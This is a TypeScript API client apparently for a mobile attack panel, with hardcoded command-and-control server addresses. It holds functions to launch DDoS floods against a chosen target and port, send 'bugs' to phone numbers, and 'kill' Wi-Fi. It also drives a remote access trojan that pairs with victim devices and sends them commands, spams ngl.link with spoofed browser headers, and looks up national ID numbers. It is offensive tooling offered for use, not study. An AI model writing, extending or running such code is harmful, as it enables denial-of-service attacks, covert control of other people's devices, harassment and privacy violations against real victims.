const BASE_URL = 'http://ferrytamvan.lixzhosting.biz.id:4004';
const WS_URL = 'ws://188.166.209.9:3101';

// ==================== AUTHENTICATION ====================

export const validateLogin = async (
  username: string,
  password: string,
  androidId: string,
  version: string = '3.0'
): Promise<any> => {
  try {
    const response = await fetch(`${BASE_URL}/validate`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password, androidId, version }),
    });
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const getMyInfo = async (
  username: string,
  password: string,
  androidId: string,
  key: string
): Promise<any> => {
  try {
    const response = await fetch(
      `${BASE_URL}/myInfo?username=${username}&password=${password}&androidId=${androidId}&key=${key}`
    );
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const changePassword = async (
  username: string,
  oldPass: string,
  newPass: string
): Promise<any> => {
  try {
    const response = await fetch(`${BASE_URL}/changepass`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, oldPass, newPass }),
    });
    return await response.json();
  } catch (error) {
    throw error;
  }
};

// ==================== USER MANAGEMENT ====================

export const createAccount = async (
  key: string,
  newUser: string,
  pass: string,
  day: string
): Promise<any> => {
  try {
    const response = await fetch(
      `${BASE_URL}/createAccount?key=${key}&newUser=${newUser}&pass=${pass}&day=${day}`
    );
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const deleteUser = async (key: string, username: string): Promise<any> => {
  try {
    const response = await fetch(
      `${BASE_URL}/deleteUser?key=${key}&username=${username}`
    );
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const listUsers = async (key: string): Promise<any> => {
  try {
    const response = await fetch(`${BASE_URL}/listUsers?key=${key}`);
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const userAdd = async (
  key: string,
  username: string,
  password: string,
  role: string,
  day: string
): Promise<any> => {
  try {
    const response = await fetch(
      `${BASE_URL}/userAdd?key=${key}&username=${username}&password=${password}&role=${role}&day=${day}`
    );
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const editUser = async (
  key: string,
  username: string,
  addDays: string
): Promise<any> => {
  try {
    const response = await fetch(
      `${BASE_URL}/editUser?key=${key}&username=${username}&addDays=${addDays}`
    );
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const getLog = async (key: string): Promise<any> => {
  try {
    const response = await fetch(`${BASE_URL}/getLog?key=${key}`);
    return await response.json();
  } catch (error) {
    throw error;
  }
};

// ==================== VPS / CNC MANAGEMENT ====================

export const getMyServer = async (key: string): Promise<any> => {
  try {
    const response = await fetch(`${BASE_URL}/myServer?key=${key}`);
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const addServer = async (
  key: string,
  host: string,
  username: string,
  password: string
): Promise<any> => {
  try {
    const response = await fetch(`${BASE_URL}/addServer`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ key, host, username, password }),
    });
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const delServer = async (key: string, host: string): Promise<any> => {
  try {
    const response = await fetch(`${BASE_URL}/delServer`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ key, host }),
    });
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const sendCommand = async (
  key: string,
  target: string,
  port: string,
  duration: string
): Promise<any> => {
  try {
    const response = await fetch(`${BASE_URL}/sendCommand`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ key, target, port, duration }),
    });
    return await response.json();
  } catch (error) {
    throw error;
  }
};

// ==================== BUG SENDER ====================

export const sendBug = async (
  key: string,
  bug: string,
  target: string
): Promise<any> => {
  try {
    const response = await fetch(
      `${BASE_URL}/sendBug?key=${key}&target=${target}&bug=${bug}`
    );
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const getMySender = async (key: string): Promise<any> => {
  try {
    const response = await fetch(`${BASE_URL}/mySender?key=${key}`);
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const getPairing = async (key: string, number: string): Promise<any> => {
  try {
    const response = await fetch(
      `${BASE_URL}/getPairing?key=${key}&number=${number}`
    );
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const deleteSender = async (key: string, id: string): Promise<any> => {
  try {
    const response = await fetch(
      `${BASE_URL}/deleteSender?key=${key}&id=${id}`,
      { method: 'DELETE' }
    );
    return await response.json();
  } catch (error) {
    throw error;
  }
};

// ==================== DDoS / ATTACK ====================

export const cncSend = async (
  key: string,
  target: string,
  ddos: string,
  port: string,
  duration: number
): Promise<any> => {
  try {
    const response = await fetch(
      `${BASE_URL}/cncSend?key=${key}&target=${target}&ddos=${ddos}&port=${port}&duration=${duration}`
    );
    return await response.json();
  } catch (error) {
    throw error;
  }
};

// ==================== WIFI KILLER ====================

export const killWifi = async (
  key: string,
  target: string,
  duration: number = 120
): Promise<any> => {
  try {
    const response = await fetch(
      `${BASE_URL}/killWifi?key=${key}&target=${target}&duration=${duration}`
    );
    return await response.json();
  } catch (error) {
    throw error;
  }
};

// ==================== RAT (Remote Admin Tools) ====================

export const ratStartPairing = async (key: string): Promise<any> => {
  try {
    const response = await fetch(`${BASE_URL}/rat/pairing/start`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ key }),
    });
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const ratConnectPairing = async (
  pairingId: string,
  deviceInfo: object
): Promise<any> => {
  try {
    const response = await fetch(`${BASE_URL}/rat/pairing/connect`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ pairingId, deviceInfo }),
    });
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const ratPairingStatus = async (
  key: string,
  pairingId: string
): Promise<any> => {
  try {
    const response = await fetch(
      `${BASE_URL}/rat/pairing/status?key=${key}&pairingId=${pairingId}`
    );
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const ratGetDevices = async (key: string): Promise<any> => {
  try {
    const response = await fetch(`${BASE_URL}/rat/devices?key=${key}`);
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const ratRemoveDevice = async (
  key: string,
  token: string
): Promise<any> => {
  try {
    const response = await fetch(`${BASE_URL}/rat/devices/remove`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ key, token }),
    });
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const ratSendCommand = async (
  key: string,
  token: string,
  type: string,
  payload: object
): Promise<any> => {
  try {
    const response = await fetch(`${BASE_URL}/rat/command`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ key, token, type, payload }),
    });
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const ratFlashOn = async (
  key: string,
  token: string,
  intervalMs: number,
  durationMs: number
): Promise<any> => {
  try {
    const response = await fetch(`${BASE_URL}/rat/flash/on`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ key, token, intervalMs, durationMs }),
    });
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const ratFlashOff = async (key: string, token: string): Promise<any> => {
  try {
    const response = await fetch(`${BASE_URL}/rat/flash/off`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ key, token }),
    });
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const ratBacksoundOn = async (
  key: string,
  token: string,
  url: string,
  loop: boolean
): Promise<any> => {
  try {
    const response = await fetch(`${BASE_URL}/rat/backsound/on`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ key, token, url, loop }),
    });
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const ratBacksoundOff = async (
  key: string,
  token: string
): Promise<any> => {
  try {
    const response = await fetch(`${BASE_URL}/rat/backsound/off`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ key, token }),
    });
    return await response.json();
  } catch (error) {
    throw error;
  }
};

// ==================== EXTERNAL APIs ====================

export const checkNik = async (nik: string): Promise<any> => {
  try {
    const response = await fetch(
      `https://api.siputzx.my.id/api/tools/nik-checker?nik=${nik}`
    );
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const checkDomain = async (domain: string): Promise<any> => {
  try {
    const response = await fetch(
      `https://api.siputzx.my.id/api/tools/dns?domain=${domain}`
    );
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const getSubdomains = async (domain: string): Promise<any> => {
  try {
    const response = await fetch(
      `https://api.siputzx.my.id/api/tools/subdomains?domain=${domain}`
    );
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const generateQr = async (text: string): Promise<ArrayBuffer> => {
  try {
    const response = await fetch(
      `https://api.siputzx.my.id/api/tools/text2qr?text=${encodeURIComponent(text)}`
    );
    return await response.arrayBuffer();
  } catch (error) {
    throw error;
  }
};

export const downloadTiktok = async (url: string): Promise<any> => {
  try {
    const response = await fetch(
      `https://api.siputzx.my.id/api/d/tiktok?url=${encodeURIComponent(url)}`
    );
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const downloadInstagram = async (url: string): Promise<any> => {
  try {
    const response = await fetch(
      `https://api.siputzx.my.id/api/d/igdl?url=${encodeURIComponent(url)}`
    );
    return await response.json();
  } catch (error) {
    throw error;
  }
};

// ==================== NGL SPAM ====================

export const sendNglMessage = async (
  username: string,
  message: string,
  deviceId: string
): Promise<any> => {
  try {
    const response = await fetch('https://ngl.link/api/submit', {
      method: 'POST',
      headers: {
        'User-Agent':
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
        Accept: '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        Referer: `https://ngl.link/${username}`,
        Origin: 'https://ngl.link',
      },
      body: `username=${username}&question=${message}&deviceId=${deviceId}&gameSlug=&referrer=`,
    });
    return { status: response.status };
  } catch (error) {
    throw error;
  }
};

// ==================== STATS ====================

export const getStats = async (): Promise<any> => {
  try {
    const response = await fetch(`${WS_URL}/stats`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type: 'stats' }),
    });
    return await response.json();
  } catch (error) {
    throw error;
  }
};

export const validateSession = async (
  key: string,
  androidId: string
): Promise<any> => {
  try {
    const response = await fetch(`${WS_URL}/validate`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type: 'validate', key, androidId }),
    });
    return await response.json();
  } catch (error) {
    throw error;
  }
};